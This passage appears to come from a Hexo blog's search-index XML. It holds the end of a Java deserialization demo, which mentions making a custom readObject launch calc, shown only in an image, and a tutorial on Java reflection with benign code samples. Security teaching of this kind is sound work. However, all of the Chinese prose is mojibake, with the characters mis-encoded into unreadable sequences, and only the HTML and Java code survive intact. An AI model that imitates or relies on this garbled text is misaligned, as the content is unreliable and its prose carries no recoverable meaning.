loading="lazy"></p><p>ÂèØ‰ª•ÁúãÂà∞ÔºåËá™ÂÆö‰πâÁöÑreadObjectÁöÑÁ°ÆÊâßË°å‰∫ÜÔºÅ</p><p>Áé∞Âú®ÔºåÊàë‰ª¨Âú®readObject‰∏≠ÂÜô‰∏äÂç±Èô©Êìç‰ΩúÔºåÊØîÂ¶ÇÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ÔºåÂºπ‰∏™calc:</p><p><img src="4.png" loading="lazy"></p><p>ÂÖ∂ÂÆûÂ¶ÇÊûúÁªÜÂøÉËßÇÂØü‰ºöÂèëÁé∞ÔºåÂÜçËá™ÂÆö‰πâreadobjectÂáΩÊï∞ÂêéÔºåÂéüÊú¨ÁöÑÂØπË±°‰ø°ÊÅØÂπ∂Ê≤°ÊúâË¢´Ê≠£Á°ÆÊâìÂç∞ÔºåÂõ†‰∏∫Âú®Java‰∏≠ÔºåÂΩì‰Ω†Ëá™ÂÆö‰πâ<code>readObject</code>ÊñπÊ≥ïÊó∂Ôºå‰Ω†ÂÆûÈôÖ‰∏äÊòØÂú®Ë¶ÜÁõñÈªòËÆ§ÁöÑÂèçÂ∫èÂàóÂåñË°å‰∏∫„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºå<code>ObjectInputStream</code>‰ºö‰ΩøÁî®ÂèçÂ∞ÑÊù•ÊÅ¢Â§çÂØπË±°ÁöÑÁä∂ÊÄÅ„ÄÇ‰ΩÜÊòØÔºåÂ¶ÇÊûú‰Ω†Êèê‰æõ‰∫Ü‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑ<code>readObject</code>ÊñπÊ≥ïÔºåÈÇ£‰πà‰Ω†ÈúÄË¶ÅËá™Â∑±Â§ÑÁêÜÂØπË±°Áä∂ÊÄÅÁöÑÊÅ¢Â§çÔºåÂåÖÊã¨Â≠óÊÆµÁöÑËµãÂÄº„ÄÇ</p><p>Âú®<code>User</code>Á±ª‰∏≠ÔºåËá™ÂÆö‰πâÁöÑ<code>readObject</code>ÊñπÊ≥ïÂπ∂Ê≤°ÊúâË∞ÉÁî®ÈªòËÆ§ÁöÑ<code>readObject</code>Êù•ÊÅ¢Â§çÂØπË±°ÁöÑÈùûÁû¨ÊÄÅÂ≠óÊÆµÔºà<code>name</code>, <code>age</code>, <code>height</code>ÔºâÔºåËÄåÊòØÊâßË°å‰∫Ü‰∏Ä‰∏™Â§ñÈÉ®ÂëΩ‰ª§<code>calc</code>„ÄÇÂõ†Ê≠§ÔºåÂØπË±°ÁöÑÂ≠óÊÆµÂπ∂Ê≤°ÊúâË¢´Ê≠£Á°ÆÂú∞‰ªéÊµÅ‰∏≠ËØªÂèñÂíåËµãÂÄºÔºåÂØºËá¥‰∫ÜÂ≠óÊÆµÂÄº‰∏∫ÈªòËÆ§ÂÄºÔºåÂØπ‰∫éÂØπË±°ÂºïÁî®Á±ªÂûãÔºàÂ¶Ç<code>String</code>ÔºâÔºåÈªòËÆ§ÂÄºÊòØ<code>null</code>„ÄÇ</p><h3 id="0x05-Â∞èÁªì"><a href="#0x05-Â∞èÁªì" class="headerlink" title="0x05 Â∞èÁªì"></a>0x05 Â∞èÁªì</h3><p>‰ª•‰∏äÂè™ÊòØÂØπJavaÂèçÂ∫èÂàóÂåñÁöÑ‰∏Ä‰∏™Â∞èDemoÔºå‰∫ãÂÆû‰∏äÊâçÂàöÂàöÂºÄÂßãÔºå‰πãÂêéÂΩìÁÑ∂ÊúâÊõ¥ËØ¶ÁªÜÁöÑÂ≠¶‰π†</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAÂÆâÂÖ®Âü∫Á°Ä-- ÂèçÂ∞ÑÊú∫Âà∂</title>
      <link href="/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-2/"/>
      <url>/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-2/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-ÂèçÂ∞ÑÊ¶ÇÂøµ"><a href="#0x01-ÂèçÂ∞ÑÊ¶ÇÂøµ" class="headerlink" title="0x01 ÂèçÂ∞ÑÊ¶ÇÂøµ"></a>0x01 ÂèçÂ∞ÑÊ¶ÇÂøµ</h3><p>ÂèçÂ∞ÑÊòØJavaÁöÑÁâπÂæÅ‰πã‰∏ÄÔºåÊòØ‰∏ÄÁßçÈó¥Êé•Êìç‰ΩúÁõÆÊ†áÂØπË±°ÁöÑÊú∫Âà∂ÔºåÊ†∏ÂøÉÊòØJVMÂú®ËøêË°åÁä∂ÊÄÅÁöÑÊó∂ÂÄôÊâçÂä®ÊÄÅÂä†ËΩΩÁ±ªÔºåÂØπ‰∫é‰ªªÊÑè‰∏Ä‰∏™Á±ªÈÉΩËÉΩÂ§üÁü•ÈÅìËøô‰∏™Á±ªÊâÄÊúâÁöÑÂ±ûÊÄßÂíåÊñπÊ≥ïÔºåÂπ∂‰∏îÂØπ‰∫é‰ªªÊÑè‰∏Ä‰∏™ÂØπË±°ÔºåÈÉΩËÉΩÂ§üË∞ÉÁî®ÂÆÉÁöÑÊñπÊ≥ï&#x2F;ËÆøÈóÆÂ±ûÊÄß„ÄÇËøôÁßçÂä®ÊÄÅËé∑Âèñ‰ø°ÊÅØ‰ª•ÂèäÂä®ÊÄÅË∞ÉÁî®ÂØπË±°ÊñπÊ≥ïÁöÑÂäüËÉΩÊàê‰∏∫JavaËØ≠Ë®ÄÁöÑÂèçÂ∞ÑÊú∫Âà∂„ÄÇÈÄöËøá‰ΩøÁî®ÂèçÂ∞ÑÊàë‰ª¨‰∏ç‰ªÖÂèØ‰ª•Ëé∑ÂèñÂà∞‰ªª‰ΩïÁ±ªÁöÑÊàêÂëòÊñπÊ≥ï(Methods)„ÄÅÊàêÂëòÂèòÈáè(Fields)„ÄÅÊûÑÈÄ†ÊñπÊ≥ï(Constructors)Á≠â‰ø°ÊÅØÔºåËøòÂèØ‰ª•Âä®ÊÄÅÂàõÂª∫JavaÁ±ªÂÆû‰æã„ÄÅË∞ÉÁî®‰ªªÊÑèÁöÑÁ±ªÊñπÊ≥ï„ÄÅ‰øÆÊîπ‰ªªÊÑèÁöÑÁ±ªÊàêÂëòÂèòÈáèÂÄºÁ≠â„ÄÇ</p><h3 id="0x02-ÁºñËØëÊú∫Âà∂"><a href="#0x02-ÁºñËØëÊú∫Âà∂" class="headerlink" title="0x02 ÁºñËØëÊú∫Âà∂"></a>0x02 ÁºñËØëÊú∫Âà∂</h3><p>ÈùôÊÄÅÁºñËØëÔºöÂú®ÁºñËØëÊó∂Á°ÆÂÆöÂ•ΩÁ±ªÂûãÔºåÁªëÂÆöÂØπË±°„ÄÇ</p><p>Âä®ÊÄÅÁºñËØëÔºöÂú®ËøêË°åÊó∂Á°ÆÂÆöÁ±ªÂûãÔºåÁªëÂÆöÂØπË±°„ÄÇ</p><h3 id="0x03-‰ºòÁÇπ"><a href="#0x03-‰ºòÁÇπ" class="headerlink" title="0x03 ‰ºòÁÇπ"></a>0x03 ‰ºòÁÇπ</h3><p>ÂèçÂ∞ÑÔºöÂ∞ÜÁ±ªÁöÑÂêÑ‰∏™ÁªÑÊàêÈÉ®ÂàÜÂ∞ÅË£Ö‰∏∫ÂÖ∂‰ªñÂØπË±°ÔºåËøôÂ∞±ÊòØÂèçÂ∞ÑÊú∫Âà∂„ÄÇ</p><p>1„ÄÅÂèØ‰ª•Âú®Á®ãÂ∫èËøêË°åËøáÁ®ã‰∏≠ÔºåÊìç‰ΩúËøô‰∫õÂØπË±°„ÄÇ</p><p>2„ÄÅÂèØ‰ª•Ëß£ËÄ¶ÔºåÊèêÈ´òÁ®ãÂ∫èÁöÑÂèØÊâ©Â±ïÊÄß„ÄÇ</p><h3 id="0x04-Á§∫‰æãËÆ≤Ëß£"><a href="#0x04-Á§∫‰æãËÆ≤Ëß£" class="headerlink" title="0x04 Á§∫‰æãËÆ≤Ëß£"></a>0x04 Á§∫‰æãËÆ≤Ëß£</h3><p>ÂèçÂ∞ÑÊú∫Âà∂ÂèØ‰ª•Âä®ÊÄÅÂàõÂª∫ÂØπË±°ÂíåÁºñËØëÔºå‰ΩìÁé∞ÂæàÂ§ßÁöÑÁÅµÊ¥ªÊÄß„ÄÇÂú®‰∏Ä‰∏™Â§ßÂûãÁ≥ªÁªüÂèëÂ∏ÉÊó∂ÔºåÂ¶ÇÊûú‰ª•ÂêéÈúÄË¶ÅÊõ¥Êñ∞Êüê‰∫õÂäüËÉΩÁöÑÊó∂ÂÄôÔºå‰∏çÂèØËÉΩËÆ©Áî®Êà∑Â∞Ü‰πãÂâçÁöÑÊ∏∏ÊàèÂç∏ËΩΩÊéâÔºåÈáçÊñ∞ÂÆâË£ÖÊñ∞ÁöÑÁâàÊú¨„ÄÇÈááÂèñÈùôÊÄÅÁºñËØëÁöÑËØùÔºåÈúÄË¶ÅÊääÊï¥‰∏™Ê∏∏ÊàèÈáçÊñ∞ÁºñËØë‰∏ÄÊ¨°ÊâçËÉΩÂÆûÁé∞ÂäüËÉΩÁöÑÊõ¥Êñ∞ÔºåËÄå‰ΩøÁî®ÂèçÂ∞ÑÊú∫Âà∂ÁöÑËØùÔºå‰∏çÈúÄË¶ÅÂç∏ËΩΩÔºåÂè™ÈúÄË¶ÅÂú®ËøêË°åÁöÑÊó∂ÂÄôÂä®ÊÄÅÂàõÂª∫ÂíåÁºñËØëÂç≥ÂèØ„ÄÇ</p><h3 id="0x05-javaÂèçÂ∞ÑÊú∫Âà∂ÊµÅÁ®ãÂõæ"><a href="#0x05-javaÂèçÂ∞ÑÊú∫Âà∂ÊµÅÁ®ãÂõæ" class="headerlink" title="0x05 javaÂèçÂ∞ÑÊú∫Âà∂ÊµÅÁ®ãÂõæ"></a>0x05 javaÂèçÂ∞ÑÊú∫Âà∂ÊµÅÁ®ãÂõæ</h3><p><img src="1.png" loading="lazy"></p><p>ËøôÈáåÊàë‰ª¨‰ΩøÁî®‰∏Ä‰∏™ÁÆÄÈôãÁöÑÊµÅÁ®ãÂõæÈÖçÂêàËÆ≤Ëø∞‰∏ãÂèçÂ∞ÑÊú∫Âà∂Âü∫Êú¨ÊµÅÁ®ã„ÄÇÊØîÂ¶ÇÊàë‰ª¨ÂàõÂª∫‰∫Ü‰∏Ä‰∏™Á±ªÊñá‰ª∂ÔºåÁªèËøájavacÁºñËØë‰πãÂêéÔºåÂ∞±‰ºöÂΩ¢ÊàêclassÊñá‰ª∂ÔºåÂêåÊó∂jvmÂÜÖÂ≠ò‰ºöÊü•ÊâæÁîüÊàêÁöÑclassÊñá‰ª∂ËØªÂÖ•ÂÜÖÂ≠òÂíåÁªèËøáClassLoaderÂä†ËΩΩÔºåÂêåÊó∂‰ºöËá™Âä®ÂàõÂª∫ÁîüÊàê‰∏Ä‰∏™ClassÂØπË±°ÔºåÈáåÈù¢Êã•ÊúâÂÖ∂Ëé∑ÂèñÊàêÂëòÂèòÈáèFieldÔºåÊàêÂëòÊñπÊ≥ïMethodÂíåÊûÑÈÄ†ÊñπÊ≥ïConstructorÁ≠âÊñπÊ≥ï„ÄÇÊúÄÂêéÂ∞±ÊòØÊàë‰ª¨Âπ≥Êó∂newÂàõÂª∫ÂØπË±°„ÄÇ</p><p>ËøôÈáåÂÖ∂ÂÆûË∑üÊàë‰ª¨‰∫ÜËß£Âà∞javaËøêË°å‰ΩìÁ≥ªÊ≤°ÊúâÂæàÂ§ßÂå∫Âà´ÔºåÂè™ÊòØÊàë‰ª¨ÁîüÊàêclassÊñá‰ª∂ÁöÑÊó∂ÂÄôÔºå‰πüÂàõÂª∫‰∫ÜClassÂØπË±°„ÄÇËÄåClassÊòØjava.lang.ClassÁ±ª‰∏≠ÔºåÊòØÊâÄÊúâÁ±ªÁöÑÁöÑÁ±ª„ÄÇËÄåÁ±ªÊòØjava.lang.ClassÁ±ªÁöÑÂÆû‰æãÂØπË±°ÔºåÊâÄ‰ª•Êàë‰ª¨ÁöÑÂèçÂ∞ÑÊú∫Âà∂Êú¨Ë∫´‰∏çÂ§çÊùÇÔºåÂ∞±ÊòØËé∑Âèñ‰∏Ä‰∏™Á±ªÁöÑClassÂØπË±°ÔºåÁÑ∂ÂêéÂú®Áî®ClassÂØπË±°‰∏≠ÁöÑËé∑ÂèñÊàêÂëòÂèòÈáèFieldÔºåÊàêÂëòÊñπÊ≥ïMethodÂíåÊûÑÈÄ†ÊñπÊ≥ïConstructorÁ≠âÊñπÊ≥ïÔºåÂÜçÂéªÂä®ÊÄÅËé∑Âèñ‰∏Ä‰∏™Á±ªÊàñËÄÖË∞ÉÁî®‰∏Ä‰∏™Á±ªÁöÑÂ±ûÊÄßÔºåÂèòÈáèÔºåÊûÑÈÄ†ÊñπÊ≥ïÁ≠âÊñπÂºè„ÄÇ</p><h3 id="0x06-ÂèçÂ∞ÑÁªÑÊàêÁõ∏ÂÖ≥ÁöÑÁ±ª"><a href="#0x06-ÂèçÂ∞ÑÁªÑÊàêÁõ∏ÂÖ≥ÁöÑÁ±ª" class="headerlink" title="0x06 ÂèçÂ∞ÑÁªÑÊàêÁõ∏ÂÖ≥ÁöÑÁ±ª"></a>0x06 ÂèçÂ∞ÑÁªÑÊàêÁõ∏ÂÖ≥ÁöÑÁ±ª</h3><p>ÂèçÂ∞ÑÊú∫Âà∂Áõ∏ÂÖ≥Êìç‰Ωú‰∏ÄËà¨‰Ωç‰∫éjava.lang.reflectÂåÖ‰∏≠„ÄÇ</p><p><img src="2.png" loading="lazy"></p><p>ËÄåjavaÂèçÂ∞ÑÊú∫Âà∂ÁªÑÊàêÈúÄË¶ÅÈáçÁÇπÊ≥®ÊÑè‰ª•‰∏ãÁöÑÁ±ªÔºö</p><p>java.lang.ClassÔºöÁ±ªÂØπË±°;</p><p>java.lang.reflect.ConstructorÔºöÁ±ªÁöÑÊûÑÈÄ†Âô®ÂØπË±°;</p><p>java.lang.reflect.FieldÔºöÁ±ªÁöÑÂ±ûÊÄßÂØπË±°;</p><p>java.lang.reflect.MethodÔºöÁ±ªÁöÑÊñπÊ≥ïÂØπË±°;</p><h3 id="0x07-ÂèçÂ∞ÑÂ∏∏ËßÅ‰ΩøÁî®ÁöÑÊñπÊ≥ï"><a href="#0x07-ÂèçÂ∞ÑÂ∏∏ËßÅ‰ΩøÁî®ÁöÑÊñπÊ≥ï" class="headerlink" title="0x07 ÂèçÂ∞ÑÂ∏∏ËßÅ‰ΩøÁî®ÁöÑÊñπÊ≥ï"></a>0x07 ÂèçÂ∞ÑÂ∏∏ËßÅ‰ΩøÁî®ÁöÑÊñπÊ≥ï</h3><p>Ëé∑ÂèñÁ±ªÁöÑÊñπÊ≥ïÔºöforname</p><p>ÂÆû‰æãÂåñÁ±ªÂØπË±°ÁöÑÊñπÊ≥ïÔºönewInstance</p><p>Ëé∑ÂèñÂáΩÊï∞ÁöÑÊñπÊ≥ïÔºögetMethod</p><p>ÊâßË°åÂáΩÊï∞ÁöÑÊñπÊ≥ïÔºöinvoke</p><h3 id="classÂØπË±°ÁöÑËé∑ÂèñÊñπÊ≥ï"><a href="#classÂØπË±°ÁöÑËé∑ÂèñÊñπÊ≥ï" class="headerlink" title="classÂØπË±°ÁöÑËé∑ÂèñÊñπÊ≥ï"></a>classÂØπË±°ÁöÑËé∑ÂèñÊñπÊ≥ï</h3><p>‰ªé‰∏äËø∞ÊµÅÁ®ãÂõæÂàÜÊûê‰∏≠ÂèØ‰ª•ÂæóÁü•ÔºåjavaÂèçÂ∞ÑÊú∫Âà∂ÁöÑÂéüÁêÜÂü∫Á°ÄÊòØÁêÜËß£ClassÁ±ªÔºåÂú®ÂèçÂ∞Ñ‰∏≠ÔºåÊàë‰ª¨ÊÉ≥Ëé∑Âèñ‰∏Ä‰∏™Á±ªÊàñË∞ÉÁî®‰∏Ä‰∏™Á±ªÁöÑÊñπÊ≥ïÔºåÈúÄË¶ÅÂÖàËé∑ÂèñÂà∞ËØ•Á±ªÁöÑClassÂØπË±°„ÄÇ</p><p>ÂØπ‰∫éÊôÆÈÄöÁî®Êà∑Êàë‰ª¨ÂèØ‰ª•ÈááÁî®‰ª•‰∏ãÊñπÊ≥ïÂàõÂª∫ÂÆû‰æãÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ËÄåÊàë‰ª¨Âú®ÂàõÂª∫classÁ±ªÁöÑÂÆû‰æãÂØπË±°Âç¥‰∏çËÉΩ‰ΩøÁî®‰∏äËø∞ÊñπÊ≥ïÔºåËøêË°å‰ºöÊäõÂá∫ÈîôËØØ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="3.png" loading="lazy"></p><p>ÂêåÊó∂Êàë‰ª¨ÂèØ‰ª•Ë∑üËøõClassÁ±ªÁöÑÊ∫êÁ†ÅËøõË°åÊü•ÁúãÔºåÂèëÁé∞ÂÖ∂ÊûÑÈÄ†Âô®ÊòØÁßÅÊúâÁöÑÔºåÊâÄ‰ª•Âè™ÊúâJVMËÉΩÂ§üÂàõÂª∫ClassÂØπË±°„ÄÇ</p><p><img src="4.png" loading="lazy"></p><p>Âõ†‰∏∫ClassÁ±ªÊòØprivateÁßÅÊúâÂ±ûÊÄßÔºåÊàë‰ª¨‰πüÊó†Ê≥ïÈÄöËøáÂàõÂª∫ÂØπË±°ÁöÑÊñπÂºèÊù•Ëé∑ÂèñclassÂØπË±°ÔºåÈÇ£‰πàÊàë‰ª¨ÊÄéÊ†∑ÊâçËÉΩÂ§üËé∑ÂèñÂà∞classÂØπË±°Âë¢Ôºü‰∏ÄËà¨Êàë‰ª¨Ëé∑ÂèñclassÂØπË±°Â∞±Êúâ‰ª•‰∏ã‰∏âÁßçÊñπÊ≥ïÔºåÊàë‰ª¨Êù•ÈÄê‰∏ÄÁúãÁúã„ÄÇ</p><h4 id="1„ÄÅÁ±ªÁöÑ-classÂ±ûÊÄß"><a href="#1„ÄÅÁ±ªÁöÑ-classÂ±ûÊÄß" class="headerlink" title="1„ÄÅÁ±ªÁöÑ.classÂ±ûÊÄß"></a>1„ÄÅÁ±ªÁöÑ.classÂ±ûÊÄß</h4><p>Á¨¨‰∏ÄÁßçÂ∞±ÊòØÊúÄÁÆÄÂçïÊòé‰∫ÜÁöÑÊñπÂºèÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÁ±ªÂêçÁöÑÂ±ûÊÄßclassËé∑Âèñ„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c1<span class="token operator">=</span><span class="token class-name">ReflectDemo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span></code></pre><h4 id="2„ÄÅÂÆû‰æãÂåñÂØπË±°ÁöÑgetClass-ÊñπÊ≥ï"><a href="#2„ÄÅÂÆû‰æãÂåñÂØπË±°ÁöÑgetClass-ÊñπÊ≥ï" class="headerlink" title="2„ÄÅÂÆû‰æãÂåñÂØπË±°ÁöÑgetClass()ÊñπÊ≥ï"></a>2„ÄÅÂÆû‰æãÂåñÂØπË±°ÁöÑgetClass()ÊñπÊ≥ï</h4><p>Á¨¨‰∫åÁßçÊàë‰ª¨ÂèØ‰ª•ÂÖàÂÆû‰æãÂåñ‰∏Ä‰∏™ÂØπË±°Ôºå‰πãÂêéÂú®Ë∞ÉÁî®getClass()ÊñπÊ≥ï„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ReflectDemo</span> demo2<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> c2 <span class="token operator">=</span> demo2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="3„ÄÅClass-forName-String-className-ÔºöÂä®ÊÄÅÂä†ËΩΩÁ±ª"><a href="#3„ÄÅClass-forName-String-className-ÔºöÂä®ÊÄÅÂä†ËΩΩÁ±ª" class="headerlink" title="3„ÄÅClass.forName(String className)ÔºöÂä®ÊÄÅÂä†ËΩΩÁ±ª"></a>3„ÄÅClass.forName(String className)ÔºöÂä®ÊÄÅÂä†ËΩΩÁ±ª</h4><p>Á¨¨‰∏âÁßçÂàôÊòØË∞ÉÁî®ClassÁ±ª‰∏≠ÁöÑforNameÊñπÊ≥ïÔºåÂ∞ÜÂ≠óËäÇÁ†ÅÊñá‰ª∂Âä†ËΩΩËøõÂÜÖÂ≠òÔºåËøîÂõûClassÂØπË±°„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c3 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"reflectdemo.ReflectDemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Êàë‰ª¨ÂèØ‰ª•ÂÜô‰∏™ÁÆÄÂçïÁöÑÁ§∫‰æã‰ª£Á†ÅÔºåÂàÜÂà´Âà©Áî®Ëøô‰∏âÁßçÊñπÊ≥ïËé∑ÂèñÂΩìÂâçÁ±ªClassÂØπË±°ÁöÑÂΩìÂâçÁ±ªÂêç„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTemo</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Á±ªÁöÑ.classÂ±ûÊÄß</span>      <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">ReflectTemo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// ÂÆû‰æãÂåñÂØπË±°ÁöÑgetClass()ÊñπÊ≥ï</span>      <span class="token class-name">ReflectTemo</span> demo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectTemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Class</span> c2 <span class="token operator">=</span> demo<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Class.forName(String className): Âä®ÊÄÅÂä†ËΩΩÁ±ª</span>      <span class="token class-name">Class</span> c3 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ReflectTemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c3<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="5.png" loading="lazy"></p><p>‰ΩÜÂú®Ëøô‰∏âÁßçËé∑ÂèñCLassÁ±ªÊñπÂºè‰∏≠ÔºåÊàë‰ª¨‰∏ÄËà¨‰ΩøÁî®Á¨¨‰∏âÁßçÈÄöËøáClass.forNameÊñπÊ≥ïÂéªÂä®ÊÄÅÂä†ËΩΩÁ±ª„ÄÇ‰∏î‰ΩøÁî®forNameÂ∞±‰∏çÈúÄË¶ÅimportÂØºÂÖ•ÂÖ∂‰ªñÁ±ªÔºåÂèØ‰ª•Âä†ËΩΩÊàë‰ª¨‰ªªÊÑèÁöÑÁ±ª„ÄÇ</p><p>ËÄå‰ΩøÁî®Á±ª.classÂ±ûÊÄßÔºåÈúÄË¶ÅÂØºÂÖ•Á±ªÁöÑÂåÖÔºå‰æùËµñÊÄßÂ§™Âº∫ÔºåÂú®Â§ßÂûãÈ°πÁõÆ‰∏≠ÂÆπÊòìÊäõÂá∫ÁºñËØëÈîôËØØÔºõ</p><p>ËÄå‰ΩøÁî®ÂÆû‰æãÂåñÂØπË±°ÁöÑgetClass()ÊñπÊ≥ïÔºåÈúÄË¶ÅÊú¨Ë∫´ÂàõÂª∫‰∏Ä‰∏™ÂØπË±°ÔºåÊú¨Ë∫´Â∞±Ê≤°Êúâ‰∫Ü‰ΩøÁî®ÂèçÂ∞ÑÊú∫Âà∂ÊÑè‰πâ„ÄÇ</p><p>ÊâÄ‰ª•Êàë‰ª¨Âú®Ëé∑ÂèñclassÂØπË±°‰∏≠Ôºå‰∏ÄËà¨‰ΩøÁî®Class.forNameÊñπÊ≥ïÂéªËé∑Âèñ„ÄÇ</p><h3 id="Ëé∑ÂèñÊàêÂëòÂèòÈáèField"><a href="#Ëé∑ÂèñÊàêÂëòÂèòÈáèField" class="headerlink" title="Ëé∑ÂèñÊàêÂëòÂèòÈáèField"></a>Ëé∑ÂèñÊàêÂëòÂèòÈáèField</h3><p>Ëé∑ÂèñÊàêÂëòÂèòÈáèField‰Ωç‰∫éjava.lang.reflect.FieldÂåÖ‰∏≠</p><p>Field[] getFields() ÔºöËé∑ÂèñÊâÄÊúâpublic‰øÆÈ•∞ÁöÑÊàêÂëòÂèòÈáè</p><p>Field[] getDeclaredFields() Ëé∑ÂèñÊâÄÊúâÁöÑÊàêÂëòÂèòÈáèÔºå‰∏çËÄÉËôë‰øÆÈ•∞Á¨¶</p><p>Field getField(String name) Ëé∑ÂèñÊåáÂÆöÂêçÁß∞ÁöÑ public‰øÆÈ•∞ÁöÑÊàêÂëòÂèòÈáè</p><p>Field getDeclaredField(String name) Ëé∑ÂèñÊåáÂÆöÁöÑÊàêÂëòÂèòÈáè</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FieldTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> profession<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> number<span class="token punctuation">;</span>    <span class="token keyword">char</span> sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> c1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.FieldTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ÂàõÂª∫ClassÂØπË±°</span>            <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fieldArray1 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Ëé∑ÂèñÂÖ®ÈÉ®ÊàêÂëòÂèòÈáè</span>            <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fieldArray2 <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Ëé∑ÂèñÂÖ®ÈÉ®publicÊàêÂëòÂèòÈáè</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> fieldArray1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token 